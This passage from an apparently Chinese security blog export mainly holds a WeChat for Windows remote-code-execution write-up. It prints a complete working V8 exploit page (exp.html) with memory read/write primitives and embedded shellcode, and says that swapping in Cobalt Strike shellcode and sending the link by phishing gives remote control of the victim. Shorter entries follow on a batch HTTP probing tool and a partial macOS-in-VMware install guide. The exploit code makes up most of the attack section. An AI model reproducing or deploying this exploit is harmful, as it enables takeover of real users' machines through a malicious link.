<h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>该漏洞是Google V8引擎历史漏洞的衍生关联漏洞。微信客户端（Windows版本）使用V8引擎解析JavaScript代码，并关闭了沙盒模式（–no-sandbox参数)。攻击者利用上述漏洞，构造恶意钓鱼链接并通过微信发送，在引诱受害者使用微信客户端（Windows版）点击钓鱼链接后，可获取远程主机的控制权限，实现远程代码执行攻击。</p>
<h4 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h4><p>微信PC客户端（Windows）&lt; 3.2.1.141 （注：亲测较低版本可能不存在）</p>
<a id="more"></a>

<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><h5 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h5><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">操作系统：Windows <span class="number">10</span></span><br><span class="line">Wechat：<span class="number">3.1</span><span class="number">.0</span><span class="number">.41</span></span><br></pre></td></tr></table></figure>

<p>微信打开链接时会调用WeChatWeb.exe进程，默认使用–no-sandbox，构造好对应的POC即可实现攻击。</p>
<p><img src="/img/Wechat-RCE-0day/image-20210417130306791.png" alt="image-20210417130306791"></p>
<h5 id="exp-html"><a href="#exp-html" class="headerlink" title="exp.html"></a>exp.html</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">ENABLE_LOG = <span class="literal">true</span>;</span><br><span class="line">IN_WORKER = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// calc.exe shellcode msf生成calc.exe shellcode命令msfvenom -a x86 –platform windows -p windows/exec cmd=calc.exe -e x86/alpha_mixed -f c</span></span><br><span class="line"><span class="keyword">var</span> shellcode = [<span class="number">0x89</span>,<span class="number">0xe0</span>,<span class="number">0xdb</span>,<span class="number">0xc0</span>,<span class="number">0xd9</span>,<span class="number">0x70</span>,<span class="number">0xf4</span>,<span class="number">0x5f</span>,<span class="number">0x57</span>,<span class="number">0x59</span>,<span class="number">0x49</span>,<span class="number">0x49</span>,<span class="number">0x49</span>,<span class="number">0x49</span>,<span class="number">0x49</span>,<span class="number">0x49</span>,<span class="number">0x49</span>,<span class="number">0x49</span>,<span class="number">0x49</span>,<span class="number">0x49</span>,<span class="number">0x43</span>,<span class="number">0x43</span>,<span class="number">0x43</span>,<span class="number">0x43</span>,<span class="number">0x43</span>,<span class="number">0x43</span>,<span class="number">0x37</span>,<span class="number">0x51</span>,<span class="number">0x5a</span>,<span class="number">0x6a</span>,<span class="number">0x41</span>,<span class="number">0x58</span>,<span class="number">0x50</span>,<span class="number">0x30</span>,<span class="number">0x41</span>,<span class="number">0x30</span>,<span class="number">0x41</span>,<span class="number">0x6b</span>,<span class="number">0x41</span>,<span class="number">0x41</span>,<span class="number">0x51</span>,<span class="number">0x32</span>,<span class="number">0x41</span>,<span class="number">0x42</span>,<span class="number">0x32</span>,<span class="number">0x42</span>,<span class="number">0x42</span>,<span class="number">0x30</span>,<span class="number">0x42</span>,<span class="number">0x42</span>,<span class="number">0x41</span>,<span class="number">0x42</span>,<span class="number">0x58</span>,<span class="number">0x50</span>,<span class="number">0x38</span>,<span class="number">0x41</span>,<span class="number">0x42</span>,<span class="number">0x75</span>,<span class="number">0x4a</span>,<span class="number">0x49</span>,<span class="number">0x79</span>,<span class="number">0x6c</span>,<span class="number">0x7a</span>,<span class="number">0x48</span>,<span class="number">0x6d</span>,<span class="number">0x52</span>,<span class="number">0x53</span>,<span class="number">0x30</span>,<span class="number">0x63</span>,<span class="number">0x30</span>,<span class="number">0x65</span>,<span class="number">0x50</span>,<span class="number">0x53</span>,<span class="number">0x50</span>,<span class="number">0x6f</span>,<span class="number">0x79</span>,<span class="number">0x49</span>,<span class="number">0x75</span>,<span class="number">0x50</span>,<span class="number">0x31</span>,<span class="number">0x6b</span>,<span class="number">0x70</span>,<span class="number">0x70</span>,<span class="number">0x64</span>,<span class="number">0x4c</span>,<span class="number">0x4b</span>,<span class="number">0x30</span>,<span class="number">0x50</span>,<span class="number">0x46</span>,<span class="number">0x50</span>,<span class="number">0x6c</span>,<span class="number">0x4b</span>,<span class="number">0x52</span>,<span class="number">0x72</span>,<span class="number">0x54</span>,<span class="number">0x4c</span>,<span class="number">0x6c</span>,<span class="number">0x4b</span>,<span class="number">0x46</span>,<span class="number">0x32</span>,<span class="number">0x34</span>,<span class="number">0x54</span>,<span class="number">0x4e</span>,<span class="number">0x6b</span>,<span class="number">0x30</span>,<span class="number">0x72</span>,<span class="number">0x76</span>,<span class="number">0x48</span>,<span class="number">0x36</span>,<span class="number">0x6f</span>,<span class="number">0x78</span>,<span class="number">0x37</span>,<span class="number">0x51</span>,<span class="number">0x5a</span>,<span class="number">0x47</span>,<span class="number">0x56</span>,<span class="number">0x55</span>,<span class="number">0x61</span>,<span class="number">0x69</span>,<span class="number">0x6f</span>,<span class="number">0x6e</span>,<span class="number">0x4c</span>,<span class="number">0x35</span>,<span class="number">0x6c</span>,<span class="number">0x53</span>,<span class="number">0x51</span>,<span class="number">0x33</span>,<span class="number">0x4c</span>,<span class="number">0x75</span>,<span class="number">0x52</span>,<span class="number">0x36</span>,<span class="number">0x4c</span>,<span class="number">0x75</span>,<span class="number">0x70</span>,<span class="number">0x7a</span>,<span class="number">0x61</span>,<span class="number">0x78</span>,<span class="number">0x4f</span>,<span class="number">0x44</span>,<span class="number">0x4d</span>,<span class="number">0x37</span>,<span class="number">0x71</span>,<span class="number">0x5a</span>,<span class="number">0x67</span>,<span class="number">0x69</span>,<span class="number">0x72</span>,<span class="number">0x79</span>,<span class="number">0x62</span>,<span class="number">0x43</span>,<span class="number">0x62</span>,<span class="number">0x56</span>,<span class="number">0x37</span>,<span class="number">0x4e</span>,<span class="number">0x6b</span>,<span class="number">0x31</span>,<span class="number">0x42</span>,<span class="number">0x56</span>,<span class="number">0x70</span>,<span class="number">0x4c</span>,<span class="number">0x4b</span>,<span class="number">0x61</span>,<span class="number">0x5a</span>,<span class="number">0x67</span>,<span class="number">0x4c</span>,<span class="number">0x6c</span>,<span class="number">0x4b</span>,<span class="number">0x30</span>,<span class="number">0x4c</span>,<span class="number">0x76</span>,<span class="number">0x71</span>,<span class="number">0x31</span>,<span class="number">0x68</span>,<span class="number">0x7a</span>,<span class="number">0x43</span>,<span class="number">0x51</span>,<span class="number">0x58</span>,<span class="number">0x57</span>,<span class="number">0x71</span>,<span class="number">0x5a</span>,<span class="number">0x71</span>,<span class="number">0x52</span>,<span class="number">0x71</span>,<span class="number">0x4e</span>,<span class="number">0x6b</span>,<span class="number">0x33</span>,<span class="number">0x69</span>,<span class="number">0x37</span>,<span class="number">0x50</span>,<span class="number">0x57</span>,<span class="number">0x71</span>,<span class="number">0x7a</span>,<span class="number">0x73</span>,<span class="number">0x6e</span>,<span class="number">0x6b</span>,<span class="number">0x70</span>,<span class="number">0x49</span>,<span class="number">0x55</span>,<span class="number">0x48</span>,<span class="number">0x6d</span>,<span class="number">0x33</span>,<span class="number">0x66</span>,<span class="number">0x5a</span>,<span class="number">0x31</span>,<span class="number">0x59</span>,<span class="number">0x6c</span>,<span class="number">0x4b</span>,<span class="number">0x54</span>,<span class="number">0x74</span>,<span class="number">0x4c</span>,<span class="number">0x4b</span>,<span class="number">0x57</span>,<span class="number">0x71</span>,<span class="number">0x4e</span>,<span class="number">0x36</span>,<span class="number">0x56</span>,<span class="number">0x51</span>,<span class="number">0x59</span>,<span class="number">0x6f</span>,<span class="number">0x6e</span>,<span class="number">0x4c</span>,<span class="number">0x6b</span>,<span class="number">0x71</span>,<span class="number">0x38</span>,<span class="number">0x4f</span>,<span class="number">0x64</span>,<span class="number">0x4d</span>,<span class="number">0x77</span>,<span class="number">0x71</span>,<span class="number">0x49</span>,<span class="number">0x57</span>,<span class="number">0x57</span>,<span class="number">0x48</span>,<span class="number">0x4d</span>,<span class="number">0x30</span>,<span class="number">0x70</span>,<span class="number">0x75</span>,<span class="number">0x68</span>,<span class="number">0x76</span>,<span class="number">0x47</span>,<span class="number">0x73</span>,<span class="number">0x73</span>,<span class="number">0x4d</span>,<span class="number">0x6b</span>,<span class="number">0x48</span>,<span class="number">0x67</span>,<span class="number">0x4b</span>,<span class="number">0x61</span>,<span class="number">0x6d</span>,<span class="number">0x66</span>,<span class="number">0x44</span>,<span class="number">0x61</span>,<span class="number">0x65</span>,<span class="number">0x78</span>,<span class="number">0x64</span>,<span class="number">0x30</span>,<span class="number">0x58</span>,<span class="number">0x6c</span>,<span class="number">0x4b</span>,<span class="number">0x63</span>,<span class="number">0x68</span>,<span class="number">0x56</span>,<span class="number">0x44</span>,<span class="number">0x43</span>,<span class="number">0x31</span>,<span class="number">0x6a</span>,<span class="number">0x73</span>,<span class="number">0x71</span>,<span class="number">0x76</span>,<span class="number">0x6c</span>,<span class="number">0x4b</span>,<span class="number">0x76</span>,<span class="number">0x6c</span>,<span class="number">0x62</span>,<span class="number">0x6b</span>,<span class="number">0x4e</span>,<span class="number">0x6b</span>,<span class="number">0x53</span>,<span class="number">0x68</span>,<span class="number">0x45</span>,<span class="number">0x4c</span>,<span class="number">0x37</span>,<span class="number">0x71</span>,<span class="number">0x59</span>,<span class="number">0x43</span>,<span class="number">0x4e</span>,<span class="number">0x6b</span>,<span class="number">0x36</span>,<span class="number">0x64</span>,<span class="number">0x4e</span>,<span class="number">0x6b</span>,<span class="number">0x55</span>,<span class="number">0x51</span>,<span class="number">0x38</span>,<span class="number">0x50</span>,<span class="number">0x4f</span>,<span class="number">0x79</span>,<span class="number">0x52</span>,<span class="number">0x64</span>,<span class="number">0x47</span>,<span class="number">0x54</span>,<span class="number">0x31</span>,<span class="number">0x34</span>,<span class="number">0x43</span>,<span class="number">0x6b</span>,<span class="number">0x51</span>,<span class="number">0x4b</span>,<span class="number">0x33</span>,<span class="number">0x51</span>,<span class="number">0x70</span>,<span class="number">0x59</span>,<span class="number">0x52</span>,<span class="number">0x7a</span>,<span class="number">0x70</span>,<span class="number">0x51</span>,<span class="number">0x49</span>,<span class="number">0x6f</span>,<span class="number">0x59</span>,<span class="number">0x70</span>,<span class="number">0x53</span>,<span class="number">0x6f</span>,<span class="number">0x51</span>,<span class="number">0x4f</span>,<span class="number">0x30</span>,<span class="number">0x5a</span>,<span class="number">0x4c</span>,<span class="number">0x4b</span>,<span class="number">0x37</span>,<span class="number">0x62</span>,<span class="number">0x38</span>,<span class="number">0x6b</span>,<span class="number">0x4c</span>,<span class="number">0x4d</span>,<span class="number">0x73</span>,<span class="number">0x6d</span>,<span class="number">0x63</span>,<span class="number">0x5a</span>,<span class="number">0x63</span>,<span class="number">0x31</span>,<span class="number">0x6c</span>,<span class="number">0x4d</span>,<span class="number">0x6d</span>,<span class="number">0x55</span>,<span class="number">0x68</span>,<span class="number">0x32</span>,<span class="number">0x57</span>,<span class="number">0x70</span>,<span class="number">0x67</span>,<span class="number">0x70</span>,<span class="number">0x37</span>,<span class="number">0x70</span>,<span class="number">0x36</span>,<span class="number">0x30</span>,<span class="number">0x50</span>,<span class="number">0x68</span>,<span class="number">0x55</span>,<span class="number">0x61</span>,<span class="number">0x6e</span>,<span class="number">0x6b</span>,<span class="number">0x62</span>,<span class="number">0x4f</span>,<span class="number">0x6e</span>,<span class="number">0x67</span>,<span class="number">0x4b</span>,<span class="number">0x4f</span>,<span class="number">0x79</span>,<span class="number">0x45</span>,<span class="number">0x4f</span>,<span class="number">0x4b</span>,<span class="number">0x5a</span>,<span class="number">0x50</span>,<span class="number">0x6c</span>,<span class="number">0x75</span>,<span class="number">0x4c</span>,<span class="number">0x62</span>,<span class="number">0x73</span>,<span class="number">0x66</span>,<span class="number">0x31</span>,<span class="number">0x78</span>,<span class="number">0x69</span>,<span class="number">0x36</span>,<span class="number">0x7a</span>,<span class="number">0x35</span>,<span class="number">0x4d</span>,<span class="number">0x6d</span>,<span class="number">0x6d</span>,<span class="number">0x4d</span>,<span class="number">0x4b</span>,<span class="number">0x4f</span>,<span class="number">0x78</span>,<span class="number">0x55</span>,<span class="number">0x67</span>,<span class="number">0x4c</span>,<span class="number">0x55</span>,<span class="number">0x56</span>,<span class="number">0x63</span>,<span class="number">0x4c</span>,<span class="number">0x37</span>,<span class="number">0x7a</span>,<span class="number">0x4b</span>,<span class="number">0x30</span>,<span class="number">0x69</span>,<span class="number">0x6b</span>,<span class="number">0x79</span>,<span class="number">0x70</span>,<span class="number">0x74</span>,<span class="number">0x35</span>,<span class="number">0x76</span>,<span class="number">0x65</span>,<span class="number">0x4d</span>,<span class="number">0x6b</span>,<span class="number">0x31</span>,<span class="number">0x57</span>,<span class="number">0x52</span>,<span class="number">0x33</span>,<span class="number">0x43</span>,<span class="number">0x42</span>,<span class="number">0x42</span>,<span class="number">0x4f</span>,<span class="number">0x71</span>,<span class="number">0x7a</span>,<span class="number">0x75</span>,<span class="number">0x50</span>,<span class="number">0x50</span>,<span class="number">0x53</span>,<span class="number">0x39</span>,<span class="number">0x6f</span>,<span class="number">0x48</span>,<span class="number">0x55</span>,<span class="number">0x65</span>,<span class="number">0x33</span>,<span class="number">0x30</span>,<span class="number">0x61</span>,<span class="number">0x52</span>,<span class="number">0x4c</span>,<span class="number">0x51</span>,<span class="number">0x73</span>,<span class="number">0x74</span>,<span class="number">0x6e</span>,<span class="number">0x70</span>,<span class="number">0x65</span>,<span class="number">0x50</span>,<span class="number">0x78</span>,<span class="number">0x63</span>,<span class="number">0x55</span>,<span class="number">0x73</span>,<span class="number">0x30</span>,<span class="number">0x41</span>,<span class="number">0x41</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">print</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> not_optimised_out = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> target_function = (<span class="function"><span class="keyword">function</span> (<span class="params">value</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="number">0xdecaf0</span>) &#123;</span><br><span class="line">        not_optimised_out += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    not_optimised_out += <span class="number">1</span>;</span><br><span class="line">    not_optimised_out |= <span class="number">0xff</span>;</span><br><span class="line">    not_optimised_out *= <span class="number">12</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; ++i) &#123;</span><br><span class="line">    target_function(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> g_array;</span><br><span class="line"><span class="keyword">var</span> tDerivedNCount = <span class="number">17</span> * <span class="number">87481</span> - <span class="number">8</span>;</span><br><span class="line"><span class="keyword">var</span> tDerivedNDepth = <span class="number">19</span> * <span class="number">19</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cb</span>(<span class="params">flag</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (flag == <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    g_array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0</span>);</span><br><span class="line">    g_array[<span class="number">0</span>] = <span class="number">0x1dbabe</span> * <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'c01db33f'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gc</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="built_in">String</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">oobAccess</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> this_ = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">this</span>.buffer = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">this</span>.buffer_view = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.page_buffer = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">this</span>.page_view = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.prevent_opt = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> kSlotOffset = <span class="number">0x1f</span>;</span><br><span class="line">    <span class="keyword">var</span> kBackingStoreOffset = <span class="number">0xf</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">LeakArrayBuffer</span> <span class="keyword">extends</span> <span class="title">ArrayBuffer</span> </span>&#123;</span><br><span class="line">        <span class="keyword">constructor</span>() &#123;</span><br><span class="line">            <span class="keyword">super</span>(<span class="number">0x1000</span>);</span><br><span class="line">            <span class="keyword">this</span>.slot = <span class="keyword">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.page_buffer = <span class="keyword">new</span> LeakArrayBuffer();</span><br><span class="line">    <span class="keyword">this</span>.page_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(<span class="keyword">this</span>.page_buffer);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">new</span> <span class="built_in">RegExp</span>(&#123; <span class="attr">toString</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="keyword">return</span> <span class="string">'a'</span> &#125; &#125;);</span><br><span class="line">    cb(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DerivedBase</span> <span class="keyword">extends</span> <span class="title">RegExp</span> </span>&#123;</span><br><span class="line">        <span class="keyword">constructor</span>() &#123;</span><br><span class="line">            <span class="comment">// var array = null;</span></span><br><span class="line">            <span class="keyword">super</span>(</span><br><span class="line">                <span class="comment">// at this point, the 4-byte allocation for the JSRegExp `this` object</span></span><br><span class="line">                <span class="comment">// has just happened.</span></span><br><span class="line">                &#123;</span><br><span class="line">                    toString: cb</span><br><span class="line">                &#125;, <span class="string">'g'</span></span><br><span class="line">                <span class="comment">// now the runtime JSRegExp constructor is called, corrupting the</span></span><br><span class="line">                <span class="comment">// JSArray.</span></span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// this allocation will now directly follow the FixedArray allocation</span></span><br><span class="line">            <span class="comment">// made for `this.data`, which is where `array.elements` points to.</span></span><br><span class="line">            this_.buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x80</span>);</span><br><span class="line">            g_array[<span class="number">8</span>] = this_.page_buffer;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// try&#123;</span></span><br><span class="line">    <span class="keyword">var</span> derived_n = <span class="built_in">eval</span>(<span class="string">`(function derived_n(i) &#123;</span></span><br><span class="line"><span class="string">        if (i == 0) &#123;</span></span><br><span class="line"><span class="string">            return DerivedBase;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        class DerivedN extends derived_n(i-1) &#123;</span></span><br><span class="line"><span class="string">            constructor() &#123;</span></span><br><span class="line"><span class="string">                super();</span></span><br><span class="line"><span class="string">                return;</span></span><br><span class="line"><span class="string">                <span class="subst">$&#123;<span class="string">"this.a=0;"</span>.repeat(tDerivedNCount)&#125;</span></span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        return DerivedN;</span></span><br><span class="line"><span class="string">    &#125;)`</span>);</span><br><span class="line"></span><br><span class="line">    gc();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">new</span> (derived_n(tDerivedNDepth))();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.buffer_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(<span class="keyword">this</span>.buffer);</span><br><span class="line">    <span class="keyword">this</span>.leakPtr = <span class="function"><span class="keyword">function</span> (<span class="params">obj</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.page_buffer.slot = obj;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.buffer_view.getUint32(kSlotOffset, <span class="literal">true</span>, ...this.prevent_opt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.setPtr = <span class="function"><span class="keyword">function</span> (<span class="params">addr</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.buffer_view.setUint32(kBackingStoreOffset, addr, <span class="literal">true</span>, ...this.prevent_opt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.read32 = <span class="function"><span class="keyword">function</span> (<span class="params">addr</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.setPtr(addr);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.page_view.getUint32(<span class="number">0</span>, <span class="literal">true</span>, ...this.prevent_opt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.write32 = <span class="function"><span class="keyword">function</span> (<span class="params">addr, value</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.setPtr(addr);</span><br><span class="line">        <span class="keyword">this</span>.page_view.setUint32(<span class="number">0</span>, value, <span class="literal">true</span>, ...this.prevent_opt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.write8 = <span class="function"><span class="keyword">function</span> (<span class="params">addr, value</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.setPtr(addr);</span><br><span class="line">        <span class="keyword">this</span>.page_view.setUint8(<span class="number">0</span>, value, ...this.prevent_opt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.setBytes = <span class="function"><span class="keyword">function</span> (<span class="params">addr, content</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; content.length; i++) &#123;</span><br><span class="line">            <span class="keyword">this</span>.write8(addr + i, content[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trigger</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> oob = oobAccess();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> func_ptr = oob.leakPtr(target_function);</span><br><span class="line">    print(<span class="string">'[*] target_function at 0x'</span> + func_ptr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> kCodeInsOffset = <span class="number">0x1b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> code_addr = oob.read32(func_ptr + kCodeInsOffset);</span><br><span class="line">    print(<span class="string">'[*] code_addr at 0x'</span> + code_addr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">    oob.setBytes(code_addr, shellcode);</span><br><span class="line"></span><br><span class="line">    target_function(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    print(<span class="string">"start running"</span>);</span><br><span class="line">    trigger();</span><br><span class="line">&#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">    print(e);</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h5><p>将恶意的exp.html部署在HTTP服务上，使用微信内置浏览器打开部署好的链接，成功弹出计算器。</p>
<p><img src="/img/Wechat-RCE-0day/image-20210417114107973.png" alt="image-20210417114107973"></p>
<p>将exp.html中的计算器Shellcode替换成CS生成好的Shellcode（32位），实现CS上线。</p>
<p><img src="/img/Wechat-RCE-0day/image-20210417134219601.png" alt="image-20210417134219601"></p>
<h4 id="处置建议"><a href="#处置建议" class="headerlink" title="处置建议"></a>处置建议</h4><p>微信新版本修复该漏洞，建议用户立即将微信 （Windows版）更新至最新版本。</p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://mp.weixin.qq.com/s/qAnxwM1Udulj1K3Wn2awVQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/qAnxwM1Udulj1K3Wn2awVQ</a></p>
]]></content>
      <tags>
        <tag>Wechat</tag>
      </tags>
  </entry>
  <entry>
    <title>WEB批量请求器.md</title>
    <url>/2021/06/26/web%E6%89%B9%E9%87%8F%E8%AF%B7%E6%B1%82%E5%99%A8/</url>
    <content><![CDATA[<p>本工具仅限技术研究与测试，严禁用于非法用途，否则产生的一切后果自行承担。</p>
<h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>WEB批量请求器（WebBatchRequest）是对目标地址批量进行快速的存活探测、Title获取，简单的banner识别，支持HTTP代理以及可自定义HTTP请求用于批量的漏洞验证等的一款基于JAVA编写的轻量工具。</p>
<a id="more"></a>

<h5 id="支持功能"><a href="#支持功能" class="headerlink" title="支持功能"></a>支持功能</h5><ul>
<li><input checked="" disabled="" type="checkbox"> 支持数据的导入、导出</li>
<li><input checked="" disabled="" type="checkbox"> GET、POST、HEAD请求</li>
<li><input checked="" disabled="" type="checkbox"> HTTP代理</li>
<li><input checked="" disabled="" type="checkbox"> 自定义Header</li>
<li><input checked="" disabled="" type="checkbox"> 自定义Cookies</li>
<li><input checked="" disabled="" type="checkbox"> 自定义User-Agent</li>
<li><input checked="" disabled="" type="checkbox"> 跟随302跳转</li>
<li><input checked="" disabled="" type="checkbox"> 进度条功能</li>
<li><input checked="" disabled="" type="checkbox"> 自定义线程数</li>
<li><input checked="" disabled="" type="checkbox"> 默认浏览器打开</li>
<li><input checked="" disabled="" type="checkbox"> 列表结果排序</li>
<li><input checked="" disabled="" type="checkbox"> 如果有什么建议需求可以在ISSUES提出来</li>
</ul>
<h4 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h4><p><img src="/img/web%E6%89%B9%E9%87%8F%E8%AF%B7%E6%B1%82%E5%99%A8/image-20210613213901838.png" alt="image-20210613213901838"></p>
<p><img src="/img/web%E6%89%B9%E9%87%8F%E8%AF%B7%E6%B1%82%E5%99%A8/image-20210613213932554.png" alt="image-20210613213932554"></p>
<p><img src="/img/web%E6%89%B9%E9%87%8F%E8%AF%B7%E6%B1%82%E5%99%A8/image-20210613214104266.png" alt="image-20210613214104266"></p>
<h4 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/ScriptKid-Beta/</span>WebBatchRequest</span><br></pre></td></tr></table></figure>

<h4 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h4><p>欢迎师傅star，最重要的是如果师傅们有什么建议或者Bug，请在ISSUES里提出来~</p>
]]></content>
  </entry>
  <entry>
    <title>VMware 安装黑苹果系统(MacOS)</title>
    <url>/2021/06/26/VMware-%E5%AE%89%E8%A3%85%E9%BB%91%E8%8B%B9%E6%9E%9C%E7%B3%BB%E7%BB%9F(MacOS)/</url>
    <content><![CDATA[<h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>经常有时候需要测试MAC的一些软件，所以就想着用VM来安装黑苹果来进行一些软件的测试。</p>
<h4 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">操作系统：Windows <span class="number">10</span> <span class="number">10.0</span><span class="number">.18363</span></span><br><span class="line">VMware版本：VMware® Workstation <span class="number">15</span> Pro <span class="number">15.5</span><span class="number">.2</span> build<span class="number">-15785246</span></span><br></pre></td></tr></table></figure>

<a id="more"></a>

<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><h5 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h5><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">MK-Unlocker-VM15<span class="number">.5</span>.zip（Unlocker补丁，支持 Vmware <span class="number">15.5</span><span class="number">.5</span>）</span><br><span class="line">macOS.Catalina<span class="number">.10</span><span class="number">.15</span><span class="number">.5</span><span class="number">.01</span>.LY.iso（MacOS镜像）</span><br><span class="line">下载地址：链接：https:<span class="comment">//pan.baidu.com/s/1SOUCyZ0Ys7PQcxQpAhKTHg 提取码：down</span></span><br></pre></td></tr></table></figure>

<h5 id="VMware虚拟机安装"><a href="#VMware虚拟机安装" class="headerlink" title="VMware虚拟机安装"></a>VMware虚拟机安装</h5><p>这里安装VMware虚拟机不在赘述，可自行百度进行下载安装。</p>
<h5 id="解锁"><a href="#解锁" class="headerlink" title="解锁"></a>解锁</h5><p>默认的 VMware 是不支持识别苹果系统镜像的，所以需要用到Unlocker工具进行解锁，进行对MK-Unlocker-VM15.5.zip解压，然后以管理员身份运行win-install.cmd脚本</p>
